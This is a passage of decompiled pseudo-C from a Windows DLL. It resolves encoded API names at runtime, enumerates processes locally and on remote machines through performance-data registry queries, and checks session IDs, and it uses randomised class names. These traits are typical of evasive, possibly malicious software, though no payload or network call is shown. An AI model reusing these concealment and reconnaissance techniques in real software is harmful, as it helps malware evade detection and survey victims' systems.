  int v3; // edi
  int i; // eax
  int v6; // [esp+10h] [ebp-3Ch] BYREF
  int v7; // [esp+14h] [ebp-38h]
  int v8; // [esp+18h] [ebp-34h]
  int v9[7]; // [esp+1Ch] [ebp-30h] BYREF
  _DWORD v10[4]; // [esp+38h] [ebp-14h] BYREF

  v10[0] = dword_10020ABC[0];
  v10[1] = dword_10020ABC[1];
  v10[2] = dword_10020ABC[2];
  v10[3] = dword_10020ABC[3];
  v9[0] = 28;
  v7 = 0;
  v8 = 0;
  memset(&v9[1], 0, 0x18u);
  v6 = 0;
  *a1 = 0;
  v1 = sub_1000D6AB(0x1A83u);
  v2 = v1;
  if ( v1 && sub_1000C9D8(v1) )
  {
    v3 = dword_1003771C(v10, 0, 0, 18);
    if ( v3 == -1 )
      goto LABEL_13;
    for ( i = dword_10037718(v3, 0, v10, 0, v9); i; i = dword_10037718(v3, 0, v10, v8, v9) )
    {
      if ( sub_1000CAC3(v3, (int)v9, &v6) && v6 )
        sub_1000CC1A(a1, v2, v3, (int)v9);
      ++v8;
    }
    v7 = 1;
  }
  else
  {
    v3 = 0;
  }
  dword_10037714(v3);
LABEL_13:
  if ( v2 )
    sub_1000D697(v2);
  return v7;
}
// 1003771C: invalid function type has been ignored
// 10037718: invalid function type has been ignored
// 10037714: invalid function type has been ignored
// 10020ABC: using guessed type _DWORD dword_10020ABC[4];
// 10037714: using guessed type int (__stdcall *dword_10037714)(_DWORD);
// 10037718: using guessed type int (__stdcall *dword_10037718)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1003771C: using guessed type int (__stdcall *dword_1003771C)(_DWORD, _DWORD, _DWORD, _DWORD);
// 1000CD04: using guessed type _DWORD var_14[4];

//----- (1000CDF7) --------------------------------------------------------
int sub_1000CDF7()
{
  int v0; // edi
  const CHAR *v1; // eax
  const CHAR *v2; // eax
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  const CHAR *v5; // eax
  const CHAR *v6; // eax
  const CHAR *v7; // eax
  const CHAR *v8; // eax
  FARPROC ProcAddress; // eax

  v0 = 0;
  v1 = (const CHAR *)sub_1000C0E0((int)&unk_1001EA38);
  dword_1003770C = LoadLibraryA(v1);
  if ( !dword_1003770C )
    goto LABEL_10;
  v2 = (const CHAR *)sub_1000C0E0((int)&unk_1001EA5C);
  hModule = LoadLibraryA(v2);
  if ( !hModule )
    goto LABEL_10;
  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001EA80);
  dword_10037714 = (int (__stdcall *)(_DWORD))GetProcAddress(hModule, v3);
  v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001EAB4);
  dword_10037718 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModule, v4);
  v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001EAE4);
  dword_1003771C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModule, v5);
  v6 = (const CHAR *)sub_1000C0E0((int)&unk_1001EB10);
  dword_10037720 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModule, v6);
  v7 = (const CHAR *)sub_1000C0E0((int)&unk_1001EB48);
  dword_10037724 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(dword_1003770C, v7);
  v8 = (const CHAR *)sub_1000C0E0((int)&unk_1001EB70);
  ProcAddress = GetProcAddress(dword_1003770C, v8);
  dword_10037728 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))ProcAddress;
  if ( !dword_10037714 )
    goto LABEL_10;
  if ( dword_10037718 && dword_1003771C && dword_10037720 && dword_10037724 && ProcAddress )
    return 1;
LABEL_10:
  sub_1000CBCB();
  return v0;
}
// 10037714: using guessed type int (__stdcall *dword_10037714)(_DWORD);
// 10037718: using guessed type int (__stdcall *dword_10037718)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1003771C: using guessed type int (__stdcall *dword_1003771C)(_DWORD, _DWORD, _DWORD, _DWORD);
// 10037720: using guessed type int (__stdcall *dword_10037720)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 10037724: using guessed type int (__stdcall *dword_10037724)(_DWORD, _DWORD, _DWORD, _DWORD);
// 10037728: using guessed type int (__stdcall *dword_10037728)(_DWORD, _DWORD, _DWORD);

//----- (1000CF0C) --------------------------------------------------------
char __usercall sub_1000CF0C@<al>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, char *a4)
{
  const CHAR *v4; // eax
  DWORD LastError; // eax
  const CHAR *v6; // eax
  const CHAR *v7; // eax
  const CHAR *v8; // eax
  DWORD v9; // eax
  DWORD v10; // eax
  const CHAR *v11; // eax
  DWORD v12; // eax
  void (__stdcall *v13)(DWORD, DWORD, DWORD, const ULONG_PTR *); // edi
  DWORD v14; // eax
  DWORD v15; // eax
  DWORD v16; // eax
  bool v17; // al
  unsigned int v19; // [esp-10h] [ebp-44h] BYREF
  int v20; // [esp-Ch] [ebp-40h]
  int v21; // [esp-8h] [ebp-3Ch]
  int v22; // [esp-4h] [ebp-38h]
  FARPROC v23; // [esp+0h] [ebp-34h]
  FARPROC ProcAddress; // [esp+4h] [ebp-30h]
  FARPROC v25; // [esp+8h] [ebp-2Ch]
  HANDLE hObject; // [esp+Ch] [ebp-28h]
  HMODULE hLibModule; // [esp+10h] [ebp-24h]
  HMODULE hModule; // [esp+14h] [ebp-20h]
  int v29; // [esp+18h] [ebp-1Ch]
  unsigned int *v30; // [esp+1Ch] [ebp-18h]
  int v31; // [esp+20h] [ebp-14h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+24h] [ebp-10h]
  int (__cdecl *v33)(int, PVOID, int); // [esp+28h] [ebp-Ch]
  DWORD v34; // [esp+2Ch] [ebp-8h]
  int v35; // [esp+30h] [ebp-4h]
  int v36[75]; // [esp+34h] [ebp+0h] BYREF

  v34 = (DWORD)&unk_10022548;
  v33 = SEH_10010F90;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v34 = dword_100249C0 ^ (unsigned int)&unk_10022548;
  v36[74] = (unsigned int)v36 ^ dword_100249C0;
  v22 = a1;
  v21 = a3;
  v20 = a2;
  v19 = (unsigned int)v36 ^ dword_100249C0;
  v30 = &v19;
  hObject = (HANDLE)-1;
  hLibModule = 0;
  v35 = 0;
  memset(a4, 0, 0x109A4u);
  *((_DWORD *)a4 + 17000) = 0;
  v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001ED9C);
  hModule = GetModuleHandleA(v4);
  if ( !hModule )
  {
    LastError = GetLastError();
    RaiseException(LastError, 0, 0, 0);
  }
  v6 = (const CHAR *)sub_1000C0E0((int)&unk_1001EDC0);
  ProcAddress = GetProcAddress(hModule, v6);
  v7 = (const CHAR *)sub_1000C0E0((int)&unk_1001EDF0);
  v25 = GetProcAddress(hModule, v7);
  v8 = (const CHAR *)sub_1000C0E0((int)&unk_1001EE14);
  hModule = (HMODULE)GetProcAddress(hModule, v8);
  if ( !ProcAddress || !v25 || !hModule )
  {
    v9 = GetLastError();
    RaiseException(v9, 0, 0, 0);
  }
  hLibModule = LoadLibraryA(dword_1003772C);
  if ( !hLibModule )
  {
    v10 = GetLastError();
    RaiseException(v10, 0, 0, 0);
  }
  v11 = (const CHAR *)sub_1000C0E0((int)&unk_1001EE38);
  v23 = GetProcAddress(hLibModule, v11);
  if ( v23 )
  {
    v13 = RaiseException;
  }
  else
  {
    v12 = GetLastError();
    v13 = RaiseException;
    RaiseException(v12, 0, 0, 0);
  }
  hObject = (HANDLE)((int (__stdcall *)(int, _DWORD, unsigned int, int, int, int, FARPROC, FARPROC, FARPROC, HANDLE, HMODULE, HMODULE, int, unsigned int *, int, struct _EXCEPTION_REGISTRATION_RECORD *, int (__cdecl *)(int, PVOID, int), DWORD, int))ProcAddress)(
                      2,
                      0,
                      v19,
                      v20,
                      v21,
                      v22,
                      v23,
                      ProcAddress,
                      v25,
                      hObject,
                      hLibModule,
                      hModule,
                      v29,
                      v30,
                      v31,
                      ExceptionList,
                      v33,
                      v34,
                      v35);
  if ( hObject == (HANDLE)-1 )
  {
    v35 = 0;
    v34 = 0;
    v33 = 0;
    v14 = GetLastError();
    v13(v14, (DWORD)v33, v34, (const ULONG_PTR *)v35);
  }
  memset(v36, 0, 0x128u);
  v36[0] = 296;
  if ( !((int (__stdcall *)(HANDLE, int *))v25)(hObject, v36) )
  {
    v35 = 0;
    v34 = 0;
    v33 = 0;
    v15 = GetLastError();
    v13(v15, (DWORD)v33, v34, (const ULONG_PTR *)v35);
  }
  do
  {
    if ( !lstrcpynA(&a4[272 * *((_DWORD *)a4 + 17000)], (LPCSTR)&v36[9], 261) )
    {
      v35 = 0;
      v34 = 0;
      v33 = 0;
      v16 = GetLastError();
      v13(v16, (DWORD)v33, v34, (const ULONG_PTR *)v35);
    }
    ((void (__stdcall *)(char *))v23)(&a4[272 * *((_DWORD *)a4 + 17000)]);
    *(_DWORD *)&a4[272 * *((_DWORD *)a4 + 17000) + 264] = v36[2];
    *(_DWORD *)&a4[272 * (*((_DWORD *)a4 + 17000))++ + 268] = v36[6];
  }
  while ( ((int (__stdcall *)(HANDLE, int *))hModule)(hObject, v36) && *((_DWORD *)a4 + 17000) < 0xFAu );
  v17 = GetLastError() == 18 || *((_DWORD *)a4 + 17000) == 250;
  HIBYTE(v29) = v17;
  v35 = 1;
  if ( hObject != (HANDLE)-1 )
    CloseHandle(hObject);
  if ( hLibModule )
    FreeLibrary(hLibModule);
  return HIBYTE(v29);
}
// 1000CF0C: could not find valid save-restore pair for ebx
// 1000CF0C: could not find valid save-restore pair for edi
// 1000CF0C: could not find valid save-restore pair for esi
// 100249C0: using guessed type int dword_100249C0;

//----- (1000D1B5) --------------------------------------------------------
BOOL __cdecl sub_1000D1B5(DWORD dwProcessId, DWORD *pSessionId)
{
  return ProcessIdToSessionId(dwProcessId, pSessionId);
}

//----- (1000D1CA) --------------------------------------------------------
char __cdecl sub_1000D1CA(LPCSTR lpString1, _DWORD *a2, int a3, char a4)
{
  DWORD CurrentProcessId; // eax
  int v5; // esi
  DWORD pSessionId; // [esp+10h] [ebp-28h] BYREF
  DWORD v8; // [esp+14h] [ebp-24h] BYREF
  unsigned int i; // [esp+18h] [ebp-20h]
  CPPEH_RECORD ms_exc; // [esp+20h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  *a2 = 0;
  if ( *(_DWORD *)(a3 + 68000) > 0xFAu )
    RaiseException(0, 0, 0, 0);
  pSessionId = 0;
  CurrentProcessId = GetCurrentProcessId();
  if ( !sub_1000D1B5(CurrentProcessId, &pSessionId) )
    RaiseException(0, 0, 0, 0);
  for ( i = 0; i < *(_DWORD *)(a3 + 68000); ++i )
  {
    v5 = a3 + 272 * i;
    if ( !lstrcmpiA(lpString1, (LPCSTR)v5) )
    {
      v8 = 0;
      if ( a4 == 1 && !sub_1000D1B5(*(_DWORD *)(v5 + 264), &v8) )
        RaiseException(0, 0, 0, 0);
      if ( v8 == pSessionId )
      {
        *a2 = *(_DWORD *)(v5 + 264);
        ms_exc.registration.TryLevel = -2;
        return 1;
      }
    }
  }
  return 1;
}

//----- (1000D2B2) --------------------------------------------------------
char __cdecl sub_1000D2B2(LPCSTR lpString2)
{
  FARPROC v1; // esi
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  DWORD ModuleFileNameA; // eax
  LPSTR CommandLineA; // eax
  FARPROC ProcAddress; // [esp+10h] [ebp-130h]
  HMODULE hModule; // [esp+14h] [ebp-12Ch]
  char v9; // [esp+1Bh] [ebp-125h]
  CHAR Filename[268]; // [esp+1Ch] [ebp-124h] BYREF
  CPPEH_RECORD ms_exc; // [esp+128h] [ebp-18h]

  v9 = 0;
  v1 = 0;
  ProcAddress = 0;
  ms_exc.registration.TryLevel = 0;
  if ( !lpString2 )
  {
    ms_exc.registration.TryLevel = -2;
    return 0;
  }
  memset(Filename, 0, 0x105u);
  hModule = LoadLibraryA(dword_1003772C);
  if ( hModule )
  {
    v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001EFA0);
    ProcAddress = GetProcAddress(hModule, v3);
    v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001EFC0);
    v1 = GetProcAddress(hModule, v4);
  }
  ModuleFileNameA = GetModuleFileNameA(0, Filename, 0x105u);
  if ( !ModuleFileNameA || ModuleFileNameA == 261 )
  {
    if ( !ProcAddress )
    {
      v9 = 0;
      goto LABEL_14;
    }
    CommandLineA = GetCommandLineA();
    if ( ((int (__stdcall *)(LPSTR, LPCSTR))ProcAddress)(CommandLineA, lpString2) )
      goto LABEL_12;
  }
  else if ( v1 )
  {
    ((void (__stdcall *)(CHAR *))v1)(Filename);
    if ( !lstrcmpiA(Filename, lpString2) )
LABEL_12:
      v9 = 1;
  }
LABEL_14:
  if ( hModule )
    FreeLibrary(hModule);
  return v9;
}

//----- (1000D3E6) --------------------------------------------------------
int __cdecl sub_1000D3E6(int a1, int a2, int a3, unsigned int a4)
{
  unsigned int i; // ecx
  unsigned int j; // eax
  bool v6; // zf
  int v8; // [esp+18h] [ebp-1Ch]

  v8 = 0;
  for ( i = 0; i < a2 - a4; ++i )
  {
    for ( j = 0; ; ++j )
    {
      v6 = j == a4;
      if ( j >= a4 )
        break;
      if ( *(_BYTE *)(j + i + a1) != *(_BYTE *)(j + a3) )
      {
        v6 = j == a4;
        break;
      }
    }
    if ( v6 )
      v8 = i + a1;
  }
  return v8;
}

//----- (1000D453) --------------------------------------------------------
char __cdecl sub_1000D453(int a1, LPCSTR lpMachineName)
{
  HANDLE ProcessHeap; // eax
  HANDLE v3; // eax
  LSTATUS v4; // eax
  HANDLE v5; // eax
  char *v6; // edi
  unsigned int v7; // eax
  char *v8; // esi
  int v9; // edi
  HANDLE v10; // eax
  HANDLE v11; // eax
  void *v13; // [esp-8h] [ebp-54h]
  DWORD v14; // [esp-4h] [ebp-50h]
  DWORD v15; // [esp-4h] [ebp-50h]
  void *v16; // [esp-4h] [ebp-50h]
  const CHAR *lpValueName; // [esp+18h] [ebp-34h]
  BYTE *lpData; // [esp+1Ch] [ebp-30h]
  HKEY phkResult; // [esp+20h] [ebp-2Ch] BYREF
  LPVOID lpMem; // [esp+24h] [ebp-28h]
  unsigned int i; // [esp+28h] [ebp-24h]
  DWORD cbData; // [esp+2Ch] [ebp-20h] BYREF
  char v23; // [esp+33h] [ebp-19h]
  CPPEH_RECORD ms_exc; // [esp+34h] [ebp-18h]

  v23 = 1;
  phkResult = 0;
  lpMem = 0;
  ms_exc.registration.TryLevel = 0;
  if ( RegConnectRegistryA(lpMachineName, HKEY_PERFORMANCE_DATA, &phkResult) )
    RaiseException(0, 0, 0, 0);
  cbData = 0;
  if ( RegQueryValueExA(phkResult, ::lpValueName, 0, 0, 0, &cbData) )
    RaiseException(0, 0, 0, 0);
  v14 = cbData;
  ProcessHeap = GetProcessHeap();
  lpData = (BYTE *)HeapAlloc(ProcessHeap, 8u, v14);
  if ( !lpData )
    RaiseException(0, 0, 0, 0);
  if ( RegQueryValueExA(phkResult, ::lpValueName, 0, 0, lpData, &cbData) )
    RaiseException(0, 0, 0, 0);
  lpValueName = (const CHAR *)sub_1000D3E6((int)lpData, cbData, (int)&unk_1001ED68, 9u);
  if ( !lpValueName )
    RaiseException(0, 0, 0, 0);
  while ( *(lpValueName - 1) )
    --lpValueName;
  cbData = 4096;
  v3 = GetProcessHeap();
  lpMem = HeapAlloc(v3, 8u, 0x1000u);
  if ( !lpMem )
    RaiseException(0, 0, 0, 0);
  v4 = 0;
  for ( i = 0; i < 0x1E; ++i )
  {
    v15 = cbData;
    v13 = lpMem;
    v5 = GetProcessHeap();
    lpMem = HeapReAlloc(v5, 8u, v13, v15);
    if ( !lpMem )
      RaiseException(0, 0, 0, 0);
    v4 = RegQueryValueExA(phkResult, lpValueName, 0, 0, (LPBYTE)lpMem, &cbData);
    if ( v4 != 234 )
      break;
    cbData *= 2;
  }
  if ( v4 )
    RaiseException(0, 0, 0, 0);
  if ( memcmp(lpMem, aPerf, 8u) )
    RaiseException(0, 0, 0, 0);
  v6 = (char *)lpMem + *((unsigned __int8 *)lpMem + 24);
  v7 = (unsigned __int8)v6[40] - 1;
  *(_DWORD *)(a1 + 68000) = v7;
  if ( v7 >= 0x109A0 )
    RaiseException(0, 0, 0, 0);
  v8 = &v6[*((_DWORD *)v6 + 1)];
  for ( i = 0; *(_DWORD *)(a1 + 68000) > i; ++i )
  {
    v9 = 272 * i + a1;
    wsprintfA((LPSTR)v9, "%.255S.exe", (const wchar_t *)&v8[(unsigned __int8)v8[16]]);
    *(_DWORD *)(v9 + 264) = 1;
    v8 += (unsigned __int8)v8[(unsigned __int8)*v8] + (unsigned __int8)*v8;
  }
  ms_exc.registration.TryLevel = -2;
  v16 = lpMem;
  v10 = GetProcessHeap();
  HeapFree(v10, 0, v16);
  v11 = GetProcessHeap();
  HeapFree(v11, 0, lpData);
  RegCloseKey(phkResult);
  return v23;
}
// 1001ED74: using guessed type wchar_t aPerf[4];

//----- (1000D697) --------------------------------------------------------
BOOL __cdecl sub_1000D697(LPVOID lpMem)
{
  HANDLE ProcessHeap; // eax

  ProcessHeap = GetProcessHeap();
  return HeapFree(ProcessHeap, 0, lpMem);
}

//----- (1000D6AB) --------------------------------------------------------
LPVOID __cdecl sub_1000D6AB(SIZE_T dwBytes)
{
  HANDLE ProcessHeap; // eax

  ProcessHeap = GetProcessHeap();
  return HeapAlloc(ProcessHeap, 8u, dwBytes);
}

//----- (1000D6BF) --------------------------------------------------------
_DWORD *__thiscall sub_1000D6BF(_DWORD *this)
{
  _DWORD *result; // eax

  result = this;
  *this = &sr::Snsziibtx::`vftable';
  return result;
}
// 1001B2E8: using guessed type void *sr::Snsziibtx::`vftable';

//----- (1000D6C8) --------------------------------------------------------
void __thiscall sub_1000D6C8(_DWORD *this)
{
  *this = &sr::Snsziibtx::`vftable';
}
// 1001B2E8: using guessed type void *sr::Snsziibtx::`vftable';

//----- (1000D6CF) --------------------------------------------------------
_DWORD *__thiscall sub_1000D6CF(_DWORD *this)
{
  _DWORD *v1; // ecx

  sub_1000D6BF(this);
  *v1 = &sr::GfnpwoMadjdwvkl::`vftable';
  return v1;
}
// 1000D6D4: variable 'v1' is possibly undefined
// 1001B2F0: using guessed type void *sr::GfnpwoMadjdwvkl::`vftable';

//----- (1000D6DD) --------------------------------------------------------
void __thiscall sub_1000D6DD(_DWORD *this)
{
  *this = &sr::GfnpwoMadjdwvkl::`vftable';
  sub_1000D6C8(this);
}
// 1001B2F0: using guessed type void *sr::GfnpwoMadjdwvkl::`vftable';

//----- (1000D6E8) --------------------------------------------------------
_DWORD *__thiscall sub_1000D6E8(_DWORD *this)
{
  _DWORD *v1; // ecx

  sub_1000D6BF(this);
  *v1 = &sr::HfpmmmiamaHpnxxaqhf::`vftable';
  return v1;
}
// 1000D6ED: variable 'v1' is possibly undefined
// 1001B2F8: using guessed type void *sr::HfpmmmiamaHpnxxaqhf::`vftable';

//----- (1000D6F6) --------------------------------------------------------
void __thiscall sub_1000D6F6(_DWORD *this)
{
  *this = &sr::HfpmmmiamaHpnxxaqhf::`vftable';
  sub_1000D6C8(this);
}
// 1001B2F8: using guessed type void *sr::HfpmmmiamaHpnxxaqhf::`vftable';

//----- (1000D701) --------------------------------------------------------
_DWORD *__thiscall sub_1000D701(_DWORD *this)
{
  _DWORD *v1; // ecx

  sub_1000D6BF(this);
  *v1 = &sr::TyxCkOnhqdgZuatyxcko::`vftable';
  return v1;
}
// 1000D706: variable 'v1' is possibly undefined
// 1001B390: using guessed type void *sr::TyxCkOnhqdgZuatyxcko::`vftable';

//----- (1000D70F) --------------------------------------------------------
void __thiscall sub_1000D70F(_DWORD *this)
{
  *this = &sr::TyxCkOnhqdgZuatyxcko::`vftable';
  sub_1000D6C8(this);
}
// 1001B390: using guessed type void *sr::TyxCkOnhqdgZuatyxcko::`vftable';

//----- (1000D71A) --------------------------------------------------------
unsigned int __cdecl sub_1000D71A(unsigned int a1)
{
  return rand() % a1;
}

//----- (1000D728) --------------------------------------------------------
void sub_1000D728()
{
  int v0; // esi
  DWORD CurrentThreadId; // eax

  v0 = _time64(0);
  CurrentThreadId = GetCurrentThreadId();
  srand(v0 + CurrentThreadId);
}

//----- (1000DCB5) --------------------------------------------------------
void __thiscall sub_1000DCB5(void *this)
{
  if ( this != (void *)dword_100249C0 )
    __report_gsfailure();
}
// 100249C0: using guessed type int dword_100249C0;

//----- (1000E059) --------------------------------------------------------
void __thiscall sub_1000E059(struct type_info *this)
{
  *(_DWORD *)this = &nxys_uwip::`vftable';
  type_info::_Type_info_dtor(this);
}
// 1001F0D0: using guessed type void *nxys_uwip::`vftable';

//----- (1000E067) --------------------------------------------------------
struct type_info *__thiscall sub_1000E067(struct type_info *Block, char a2)
{
  sub_1000E059(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000E0E6) --------------------------------------------------------
void __thiscall sub_1000E0E6(void *this)
{
  *(_DWORD *)this = &ikc::izq_ezibc::`vftable';
  sub_10012D5A(this);
}
// 1001F0D8: using guessed type void *ikc::izq_ezibc::`vftable';

//----- (1000E0F1) --------------------------------------------------------
_DWORD *__thiscall sub_1000E0F1(_DWORD *Block, char a2)
{
  *Block = &ikc::izq_ezibc::`vftable';
  sub_10012D5A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1001F0D8: using guessed type void *ikc::izq_ezibc::`vftable';

//----- (1000E113) --------------------------------------------------------
std::exception *__thiscall sub_1000E113(std::exception *this, struct exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &ikc::izq_ezibc::`vftable';
  return this;
}
// 1001F0D8: using guessed type void *ikc::izq_ezibc::`vftable';

//----- (1000E612) --------------------------------------------------------
void sub_1000E612()
{
  ;
}

//----- (1000EBB8) --------------------------------------------------------
int __cdecl sub_1000EBB8(int a1, int a2)
{
  void **v3; // eax
  FILE *v4; // eax
  int v5; // edi
  void **v6; // eax
  FILE *v7; // eax
  void **v8; // eax
  int v9; // [esp+10h] [ebp-1Ch]

  if ( a1 )
  {
    v3 = sub_100147DA();
    _lock_file2(1, v3 + 8);
    v4 = (FILE *)sub_100147DA();
    v5 = _stbuf(v4 + 1);
    v6 = sub_100147DA();
    v9 = _output_l((int)(v6 + 8), a1, 0, (int)&a2);
    v7 = (FILE *)sub_100147DA();
    _ftbuf(v5, v7 + 1);
    v8 = sub_100147DA();
    _unlock_file2(1, v8 + 8);
    return v9;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return -1;
  }
}
// 10014737: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 100148ED: using guessed type _DWORD __cdecl _lock_file2(_DWORD, _DWORD);
// 10014951: using guessed type _DWORD __cdecl _unlock_file2(_DWORD, _DWORD);

//----- (10011B15) --------------------------------------------------------
int __cdecl sub_10011B15(_DWORD *a1)
{
  if ( a1 && dword_10037A9C )
  {
    *a1 = dword_10037A9C;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 10014737: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 10037A9C: using guessed type int dword_10037A9C;

//----- (10011B4C) --------------------------------------------------------
int __cdecl sub_10011B4C(_DWORD *a1)
{
  if ( a1 && dword_10037A9C )
  {
    *a1 = dword_10037AA8;
    return 0;
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter(0, 0, 0, 0, 0);
    return 22;
  }
}
// 10014737: using guessed type int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 10037A9C: using guessed type int dword_10037A9C;
// 10037AA8: using guessed type int dword_10037AA8;

//----- (10012528) --------------------------------------------------------
void *sub_10012528()
{
  return &unk_10021910;
}

//----- (1001254C) --------------------------------------------------------
void __cdecl sub_1001254C()
{
  ;
}

//----- (10012C92) --------------------------------------------------------
int __cdecl sub_10012C92(int a1)
{
  int result; // eax

  result = a1;
  dword_10037F1C = a1;
  return result;
}
// 10037F1C: using guessed type int dword_10037F1C;

//----- (10012D5A) --------------------------------------------------------
void __thiscall sub_10012D5A(void *this)
{
  bool v1; // zf

  v1 = *((_DWORD *)this + 2) == 0;
  *(_DWORD *)this = &ikc::qlurhxmnb::`vftable';
  if ( !v1 )
    free(*((void **)this + 1));
}
// 1001F750: using guessed type void *ikc::qlurhxmnb::`vftable';

//----- (10012D7D) --------------------------------------------------------
void *__thiscall sub_10012D7D(void *Block, char a2)
{
  sub_10012D5A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10012D99) --------------------------------------------------------
int __cdecl sub_10012D99(int a1)
{
  int result; // eax

  result = a1;
  dword_10037F20 = a1;
  return result;
}
// 10037F20: using guessed type int dword_10037F20;

//----- (10012DC5) --------------------------------------------------------
void __thiscall sub_10012DC5(void *this)
{
  *(_DWORD *)this = &ikc::rnp_nhgjjqmxr::`vftable';
  sub_10012D5A(this);
}
// 1001F774: using guessed type void *ikc::rnp_nhgjjqmxr::`vftable';

//----- (10012DD0) --------------------------------------------------------
_DWORD *__thiscall sub_10012DD0(_DWORD *Block, char a2)
{
  *Block = &ikc::rnp_nhgjjqmxr::`vftable';
  sub_10012D5A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1001F774: using guessed type void *ikc::rnp_nhgjjqmxr::`vftable';

//----- (10013953) --------------------------------------------------------
std::exception *__thiscall sub_10013953(std::exception *this, struct exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &ikc::rnp_nhgjjqmxr::`vftable';
  return this;
}
// 1001F774: using guessed type void *ikc::rnp_nhgjjqmxr::`vftable';

//----- (10014631) --------------------------------------------------------
int __cdecl sub_10014631(int a1)
{
  int result; // eax

  result = a1;
  dword_10037F24 = a1;
  return result;
}
// 10037F24: using guessed type int dword_10037F24;

//----- (100147DA) --------------------------------------------------------
void **sub_100147DA()
{
  return &off_10024D78;
}
// 10024D78: using guessed type void *off_10024D78;

//----- (1001664A) --------------------------------------------------------
int sub_1001664A()
{
  dword_1003939C = _get_sse2_info();
  return 0;
}
// 100165EA: using guessed type int _get_sse2_info(void);
// 1003939C: using guessed type int dword_1003939C;

//----- (10016657) --------------------------------------------------------
void sub_10016657()
{
  dword_10038238 = 0;
}
// 10038238: using guessed type int dword_10038238;

//----- (100166CB) --------------------------------------------------------
int sub_100166CB()
{
  return _decode_pointer(dword_100380D8);
}
// 10011496: using guessed type _DWORD __cdecl _decode_pointer(_DWORD);
// 100380D8: using guessed type int dword_100380D8;

//----- (10016888) --------------------------------------------------------
int __cdecl sub_10016888(int a1)
{
  int result; // eax

  result = a1;
  dword_100380E4 = a1;
  return result;
}
// 100380E4: using guessed type int dword_100380E4;

//----- (10016892) --------------------------------------------------------
int __cdecl sub_10016892(int a1)
{
  int result; // eax

  result = a1;
  dword_100380E8 = a1;
  return result;
}
// 100380E8: using guessed type int dword_100380E8;

//----- (10016D73) --------------------------------------------------------
int __cdecl sub_10016D73(int a1, int a2, int a3)
{
  HMODULE LibraryA; // eax
  HMODULE v4; // edi
  int (__stdcall *MessageBoxA)(HWND, LPCSTR, LPCSTR, UINT); // eax
  HWND (__stdcall *GetActiveWindow)(); // eax
  HWND (__stdcall *GetLastActivePopup)(HWND); // eax
  BOOL (__stdcall *GetUserObjectInformationA)(HANDLE, int, PVOID, DWORD, LPDWORD); // eax
  HWINSTA (__stdcall *GetProcessWindowStation)(); // eax
  int (*v10)(void); // esi
  int (__stdcall *v11)(int, int, char *, int, char *); // eax
  int (__stdcall *v12)(int, int, char *, int, char *); // edi
  int v13; // eax
  int (*v14)(void); // eax
  int (__stdcall *v15)(int); // eax
  int (__stdcall *v16)(int, int, int, int); // eax
  char v18[12]; // [esp+10h] [ebp-20h] BYREF
  char v19[4]; // [esp+1Ch] [ebp-14h] BYREF
  unsigned int v20; // [esp+20h] [ebp-10h] BYREF
  int v21; // [esp+24h] [ebp-Ch] BYREF
  int v22; // [esp+28h] [ebp-8h]
  int v23; // [esp+2Ch] [ebp-4h]

  v22 = _encoded_null();
  v23 = 0;
  v21 = 0;
  v20 = 0;
  if ( !dword_10038128 )
  {
    LibraryA = LoadLibraryA(LibFileName);
    v4 = LibraryA;
    if ( !LibraryA )
      return 0;
    MessageBoxA = (int (__stdcall *)(HWND, LPCSTR, LPCSTR, UINT))GetProcAddress(LibraryA, aMessageboxa);
    if ( !MessageBoxA )
      return 0;
    dword_10038128 = _encode_pointer(MessageBoxA);
    GetActiveWindow = (HWND (__stdcall *)())GetProcAddress(v4, aGetactivewindo);
    dword_1003812C = _encode_pointer(GetActiveWindow);
    GetLastActivePopup = (HWND (__stdcall *)(HWND))GetProcAddress(v4, aGetlastactivep);
    dword_10038130 = _encode_pointer(GetLastActivePopup);
    if ( sub_10011B15(&v21) )
      _invoke_watson(0, 0, 0, 0, 0);
    if ( v21 == 2 )
    {
      GetUserObjectInformationA = (BOOL (__stdcall *)(HANDLE, int, PVOID, DWORD, LPDWORD))GetProcAddress(
                                                                                            v4,
                                                                                            aGetuserobjecti);
      dword_10038138 = _encode_pointer(GetUserObjectInformationA);
      if ( dword_10038138 )
      {
        GetProcessWindowStation = (HWINSTA (__stdcall *)())GetProcAddress(v4, aGetprocesswind);
        dword_10038134 = _encode_pointer(GetProcessWindowStation);
      }
    }
  }
  if ( dword_10038134 == v22
    || dword_10038138 == v22
